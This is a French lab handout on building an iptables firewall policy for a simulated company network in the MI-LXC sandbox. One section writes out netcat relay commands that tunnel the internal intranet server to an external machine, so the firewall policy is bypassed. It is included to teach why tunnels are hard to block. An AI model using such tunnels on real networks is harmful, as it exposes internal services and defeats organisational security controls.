# TP2 - Firewall

_Sébastien Mériot ([@smeriot](https://twitter.com/smeriot))_

_Cet énoncé est très fortement inspiré d'un TP créé par François Lesueur ([énoncé original](https://github.com/flesueur/srs/blob/master/tp2-firewall.md)) et que nous avons co-animé à l'INSA
Lyon il y a quelques mois._

Durée: 4 heures

Préparation de l'environnement
==============================

Tout comme le [TP1](https://github.com/PandiPanda69/edu-isen-tp-ap4/blob/main/TP1-MitM.md), ce TP sera réalisé en s'appuyant sur la plateforme [MI-LXC](https://github.com/flesueur/mi-lxc).

Pour rappel, l'infrastructure déployée simule plusieurs postes dont un SI d'entreprise (firewall, DMZ, intranet, authentification centralisée, serveur de fichiers, quelques postes de travail internes de l'entreprise _Target_),
une machine d'attaquant "isp-a-hacker" et quelques autres servant à l'intégration de l'ensemble.

> Pour les curieux, le code de MI-LXC, qui sert à générer cette VM automatiquement, est disponible avec une procédure d'installation documentée [ici](https://github.com/flesueur/mi-lxc)

Vous devez vous connecter à la VM en root/root. MI-LXC est déjà installé et l'infrastructure déployée, il faut avec un terminal aller dans le dossier `/root/mi-lxc`.
Pour démarrer l'infrastructure, tapez `./mi-lxc.py start`. Une fois l'environnement démarré, le firewall est à configurer sur la machine "target-router"
(`./mi-lxc.py attach target-router`). Vous devrez travailler en root (mot de passe : root) pendant tout le TP (car seul root est habilité à manipuler le pare-feu).

> Dans la VM et sur les machines MI-LXC, vous pouvez installer des logiciels supplémentaires. Par défaut, vous avez mousepad pour éditer des fichiers de manière graphique. La VM peut être affichée en plein écran. Si cela ne fonctionne pas, il faut parfois changer la taille de fenêtre manuellement, en tirant dans l'angle inférieur droit, pour que VirtualBox détecte que le redimensionnement automatique est disponible. Il y a une case adéquate (taille d'écran automatique) dans le menu écran qui doit être cochée. Si rien ne marche, c'est parfois en redémarrant la VM que cela peut se déclencher. Mais il *faut* la VM en plein écran.

Avant de commencer le TP, et même si nous avons abordé `iptables` et `netfilter` en cours, vous devez lire le chapitre
[Netfilter](https://fr.wikibooks.org/wiki/Administration_r%C3%A9seau_sous_Linux/Netfilter) du Wikilivre "Administration Réseau sous Linux".

>Note 1 : Pour les plus aventuriers, il est possible d'utiliser nftables, le successeur d'iptables. Quelques infos de démarrage sont proposées
>[ici](https://wiki.nftables.org/wiki-nftables/index.php/Simple_rule_management)

>Note 2 : Le TP est prévu sur IPv4, mais l'infrastructure supporte également IPv6. Vous pouvez donc aussi regarder IPv6 si vous le souhaitez.

Cheat sheet
===========

Voici un petit résumé des commandes dont vous aurez besoin :

| Commande | Description | Utilisation |
| -------- | ----------- | ----------- |
| print    | Génère la cartographie du réseau | ./mi-lxc.py print |
| attach   | Permet d'avoir un shell sur une machine | ./mi-lxc.py attach root@target-commercial |
| display  | Lance un serveur X sur la machine cible | ./mi-lxc.py display target-commercial |
| start    | Lance la construction du bac à sable    | ./mi-lxc.py start |
| stop     | Eteint la plateforme pédagogique        | ./mi-lxc.py stop |
| renet    | Redéploie le réseau à partir des fichiers json | ./mi-lxc.py stop && ./mi-lxc.py renet |

Rappel: Vous devez être dnas le répertoire `mi-lxc` pour exécuter ces commandes.

Topologie du routeur
====================

Connectez-vous sur la machine "target-router" : `./mi-lxc.py attach target-router`

Puis regardez sa configuration réseau avec notamment ses deux interfaces (à quoi servirait un routeur avec une seule...) "eth0" et "eth1", par exemple
avec `ifconfig` ou `ip addr`.

1. Identifiez laquelle se situe côté interne et laquelle côté externe de l'entreprise et notez l'adresse IP de chacune.

Protection de la machine firewall
=================================

Nous allons maintenant mettre en place un firewall sur la machine "target-router". En utilisant la page de manuel d'iptables, affichez l'ensemble des
règles actives. Vous devriez voir quelque chose qui ressemble à :

```
Chain FORWARD (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 ACCEPT     all  --  eth0   eth1    0.0.0.0/0            100.80.1.2          
    0     0 ACCEPT     all  --  eth0   eth1    0.0.0.0/0            0.0.0.0/0            state RELATED,ESTABLISHED
    0     0 ACCEPT     all  --  eth1   eth0    0.0.0.0/0            0.0.0.0/0           

Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
```

Vous voyez donc pour chaque chaîne :

* la "policy" (comportement par défaut) ;
* le nombre de paquets qui ont traversé les règles de la chaîne ;
* le nombre d'octets correspondants.

Pour le moment, peu de règles sont définies ; par la suite, cette commande vous permettra de lister l'ensemble des règles actives dans la table "filter".

Première règle iptables
-----------------------

Dans ce TP, nous allons utiliser la machine "isp-a-hacker" afin de simuler un attaquant qui souhaiterait s'en prendre au réseau de l'entreprise "target".

Vérifiez que vous pouvez vous connecter en SSH sur la machine "target-router" depuis la machine "isp-a-hacker" (`./mi-lxc.py attach isp-a-hacker`) :

`ssh root@100.64.0.10`

> L'IP _100.64.0.10_ est l'IP publique de "target-router". Vous pouvez le voir en faisant un `./mi-lxc.py print`)

Nous allons maintenant interdire toutes les connexions sur le port 22 (SSH). Pour cela, il faut interdire dans la chaîne INPUT les paquets TCP sur le
port 22 avec la cible DROP.

Appliquez la règle avec la commande iptables sur "target-router" et détaillez-là. Essayez maintenant de vous connecter en SSH sur votre machine 
"target-router" depuis la machine "isp-a-hacker".

Nous avons ici utilisé l'action DROP. Vous pouvez constater que la connexion est bien refusée mais que le client SSH met un certain temps à s'en apercevoir.

2. Détaillez la règle iptables que vous avez appliquée.
3. Pourquoi le client SSH met un certains temps à répondre ?

Supprimez la règle iptables précédemment créée.
Appliquez la même règle en passant la cible de DROP à REJECT puis tentez à nouveau de vous connecter en SSH.

4. Quel changement observez-vous ? A votre avis pourquoi ? (n'hésitez pas à utiliser `tcpdump` pour comprendre ce qui se passe)

Priorité des règles
-------------------

Un même paquet peut correspondre à plusieurs règles de filtrage, éventuellement contradictoires : Netfilter applique les règles dans l'ordre et choisit
systématiquement la première règle correspondant au paquet (attention, certains firewalls procèdent dans le sens contraire tandis que celui de Windows
ne prend pas en compte l'ordre...). On parle alors de masquage de règles.

Afin de tester ce comportement, nous allons utiliser les paramètres de filtrage de la [section "Critères" du Wikilivre](https://fr.wikibooks.org/wiki/Administration_r%C3%A9seau_sous_Linux/Netfilter#Crit%C3%A8res).

5. Montrez sur un exemple que l'ordre des règles compte. Pour modifier le filtrage, vous aurez besoin de supprimer des règles et d'en ajouter à des endroits spécifiques : référez-vous au manuel d'iptables.
6. Mettez en place un jeu de règles autorisant le SSH sur le routeur uniquement depuis le LAN de l'entreprise (testable depuis la machine "target-admin" par exemple).

Dans la pratique, le masquage est souvent utilisé volontairement pour spécifier un cas général peu prioritaire et des cas particuliers plus prioritaires.
Évidemment, c'est également source d'erreurs dans ces cas complexes.

Modules iptables
================

iptables est extensible par un système de modules. Vous trouverez une description des modules existants dans le manuel de "iptables-extensions".

Comment
-------

Le module `comment`, comme son nom l'indique, permet d'associer un commentaire à une règle afin d'assurer la bonne compréhension par tous des règles en
place. Pour utiliser le module :
`iptables -A INPUT -m comment --comment "Ceci est un commentaire" -j...`

Multiport
---------

Le module multiport permet de créer une règle unique correspondant à plusieurs ports (plutôt que plusieurs règles) : 
`iptables -A INPUT -m multiport -p tcp --dports port1,port2,port3 -j...`

Créez une règle avec multiport autorisant les ports 22 et 53. N'hésitez pas à ajouter un commentaire pour y voir plus clair (plusieurs modules peuvent être
utilisés simultanément).

Suivi de connexion ("state")
----------------------------

Netfilter permet le suivi des connexions via le module "state" (firewall _stateful_). Ce module permet d'identifier les nouveaux flux, les flux établis et
les flux liés à un autre flux. Ce suivi de connexion permet d'affiner le filtrage de certains protocoles.

Le module "state" définit plusieurs états possibles pour les flux réseau, dont :

* NEW : c'est une nouvelle connexion
* ESTABLISHED : cette connexion est déjà connue (elle est passée par l'état NEW il y a peu de temps)
* RELATED : cette connexion est liée ou dépendante d'une connexion déjà ESTABLISHED. Attention, seul le premier paquet d'une connexion peut être RELATED,
les suivants sont ESTABLISHED. Essentiellement utilisé pour le protocole FTP.

Par exemple, la règle déjà existante dans la chaîne FORWARD :
`    0     0 ACCEPT     all  --  eth0   eth1    0.0.0.0/0            0.0.0.0/0            state RELATED,ESTABLISHED` signifie que seulement les paquets `RELATED` ou `ESTABLISHED` sont autorisés de `eth0` vers `eth1`, ie, seules les "réponses" peuvent passer dans ce sens.

Pour voir l'effet de la question suivante, tout d'abord bloquez tout en sortie avec cette politique : `iptables -P OUTPUT DROP`

Puis créez une règle pour autoriser, en sortie du firewall, uniquement les réponses à des connexions SSH entrantes (à destination du service SSH sur le firewall).

7. Explicitez la règle mise en place.

Mise en place d'une politique de sécurité réseau
================================================

Spécification
-------------

L'objectif d'une politique de sécurité réseau est de limiter les services accessibles depuis l'extérieur (approche historique) ainsi que de segmenter le
réseau interne en zones distinctes (avec autorisations limitées entre ces zones, afin de limiter les risques de propagation automatique/pivot). Une telle
politique se définit en trois étapes :

1. Création de zones réseau logiques via des sous-réseaux
2. Identification des services réseau portés, et accédés, par chaque machine
3. Définition des flux réseau autorisés entre zones en fonction des besoins identifiés précédemment (par défaut, tout doit être interdit puis les services
souhaités sont explicitement autorisés). Ceci constitue la "matrice de flux".

> Ci-dessous un exemple de matrice de flux qui pourrait correspondre aux 2 zones initiales (insuffisante, donc, et attention ce n'est pas ça qui est
implémenté par l'iptables initial) :
>
> |   src\dst  |      ext           |     int                      |
> |:----------:|:------------------:|:----------------------------:|
> |    ext     |      X             | SMTP(S),IMAP(S),HTTP(S),DNS  |
> |    int     |    tout            |        X                     |


8. En vous appuyant sur le [plan d'adressage réalisé lors du TP1](https://github.com/PandiPanda69/edu-isen-tp-ap4/blob/main/TP1-MitM.md#plan-dadressage),
décrivez sous forme de tableau une politique de sécurité réseau raisonnable pour le SI complet de l'entreprise.

Pour rappel, le réseau de l'entreprise est composé de ces différents éléments:

| Machine           | Description |
| :-------:         | ----------- |
| target-router     | Routeur     |
| target-admin      | Ordinateur de l'administrateur système. Il doit pouvoir administrer tout le parc. |
| target-commercial | Ordinateur du commercial. Il doit pouvoir accéder à l'intranet. |
| target-dev        | Ordinateur du développeur. Il doit pouvoir mettre à jour l'intranet. |
| target-dmz        | Ensemble de services à l'interface entre le SI et le reste du monde |
| target-ldap       | Authentification centralisée, nécessaire à tous les postes du SI (dont la DMZ) |
| target-filer      | Partage de fichiers qui doit être accessible à tous les postes clients internes |
| target-intranet   | Applications internes, non accessibles au reste du monde |

La commande `./mi-lxc.py print` peut vous permettre d'afficher graphiquement l'intégralité du réseau. (LAN et WAN)

Comme vu en cours, vous pouvez utiliser les commandes `netstat -laptn` ou bien `ss -lnptu` qui permettent d'afficher les ports en écoute,
et donc les services, sur une machine donnée.

Votre description (matrice de flux sous forme tabulaire avec les machines sources en lignes et destinations en colonnes et services autorisés dans les
cases, ou graphique) doit être claire et suffisamment précise pour être non ambiguë : un autre étudiant, avec cette description uniquement, devrait pouvoir
refaire **exactement** la même implémentation avec iptables.

**__Faites valider votre matrice de flux (tabulaire ou graphique, pas des commandes iptables) par l'enseignant.__**


Implémentation
--------------
Une fois que la politique réseau a été précédemment définie sur le papier (phase de spécification), nous pouvons passer à l'implémentation dans les
routeurs (sous-réseaux) et pare-feu (règles de filtrage).

Implémentez votre matrice de flux sur la machine "target-router". Vous aurez besoin de procéder en deux étapes :

* Segmenter le réseau "target" : (et je vous recommande très très fortement de prendre 10 minutes pour visionner cette [vidéo explicative](https://tube.ac-lyon.fr/videos/watch/c03fe09e-cef6-4f31-9bd1-0453d160eb85)
	* Éditer `global.json` (dans le dossier `mi-lxc`) pour spécifier les interfaces sur le routeur, dans la section "target".
	Il faut ajouter des bridges (dont le nom doit commencer par "target-") et découper l'espace 100.80.0.1/16. Enfin, il faut ajouter les interfaces
	eth2, eth3... ainsi créées à la liste des `asdev` definie juste au-dessus (avec des ';' de séparation entre interfaces)
	* Éditer `groups/target/local.json` pour modifier les adresses des interfaces et les bridges des machines internes (attention, pour un bridge nommé
	précédemment "target-dmz", il faut simplement écrire "dmz" ici, la partie "target-" est ajoutée automatiquement). Dans le même fichier vous devrez
	aussi mettre à jour les serveurs mentionnés dans les paramètres des templates "ldapclient", "sshfs" et "nodhcp", soit en remplaçant les noms de
	serveurs par leurs nouvelles adresses IP, soit en mettant à jour les enregistrements DNS correspondants (fichier `/etc/nsd/target.milxc.zone` sur
	"target-dmz")
	* Exécuter `./mi-lxc.py print` pour visualiser la topologie redéfinie
	* Exécuter `./mi-lxc.py stop && ./mi-lxc.py renet && ./mi-lxc.py start` pour mettre à jour l'infrastructure déployée
* Implémenter de manière adaptée les commandes iptables sur la machine "target-router" (dans la chaîne FORWARD). Si possible dans un script (qui nettoie
les règles au début), en cas d'erreur. (Vous pouvez utiliser les commandes `iptables-save` et `iptables-apply` notamment.)

9. Détaillez les opérations que vous menez.

> L'arborescence de MI-LXC et les fichiers json manipulés ici sont décrits [ici](https://github.com/flesueur/mi-lxc#how-to-extend).

Contournement de la politique
-----------------------------

Imaginez que vous êtes le développeur (encore) et que vous souhaitez fournir un accès au serveur web interne de prototypage "target-intranet" à un
client externe, alors que celui-ci n'est normalement pas accessible de l'externe ! Vous allez créer un tunnel pour contourner la politique de sécurité.
Vous disposez pour cela des machines "target-dev" (votre poste de travail interne) et "isp-a-home" (une machine extérieure, à votre domicile).

Nous allons utiliser l'outil `netcat` pour établir un tunnel très simple.

Connectez-vous sur la machine "isp-a-home". Nous allons commencer par éteindre le service _Apache_ en écoute pour libérer le port 80 qui nous sera utile
puis nous allons écouter les connexions sur le port HTTP (TCP/80).
```bash
service apache2 stop
while true; do nc -v -l -p 80 -c "nc -l -p 8080"; done
```

Enfin, côté "target-dev", nous mettons en place la connexion sortante vers la machine distante:
```bash
while true; do nc -v 100.120.0.3 80 -c "nc 100.80.0.5 80"; sleep 2; done
```

>Pour rappel :
>* 100.120.0.3 = isp-a-home
>* 100.80.0.5 = target-intranet

Testez (avec la machine du hacker) que vous pouvez bien accéder au serveur intranet depuis l'externe sans aucun contrôle via l'URL `http://100.120.0.3:8080`

10. A l'aide d'un schéma, expliquez ce phénomène.

Il est très difficile de bloquer ou même détecter les tunnels (imaginez un tunnel chiffré par SSH, ou qui mime une apparence de HTTP, etc.)

Bonus
=====

FTP
---

FTP, comme quelques autres protocoles, présente des difficultés particulières pour les firewalls. En effet, la partie contrôle de FTP se passe sur une
connexion (et un port) distinct de la partie données. Les firewalls modernes savent créer le lien entre ces deux connexions pour y appliquer un contrôle
adapté.

Un serveur FTP est installé sur "target-dmz", configurez le firewall pour permettre son usage (transfert de fichiers) depuis une machine externe au SI.
Attention, le FTP demande une connexion avec un utilisateur existant, par exemple debian/debian.

Shorewall
---------
Vous avez pu vous rendre compte de la complexité du réglage manuel du pare-feu. En particulier, la lecture des règles existantes ou la vérification de leur
cohérence présente de nombreuses difficultés. La maintenance d'une telle solution est donc complexe dans un environnement de production : les règles
changent souvent et demandent une inspection régulière.

De nombreuses solutions ont été développées pour faciliter la gestion des règles iptables. Nous allons ici utiliser Shorewall. Shorewall n'est pas un démon
et repose entièrement sur iptables. Il consiste en une série de scripts permettant de simplifier la configuration, notamment en définissant la notion de 
zones. Sur "target-router", installez shorewall (`apt-get install shorewall`) puis réimplémentez votre politique de sécurité avec cet outil.

_Note : Pour les plus aventuriers, il est possible d'expérimenter firewalld, un outil plus moderne_
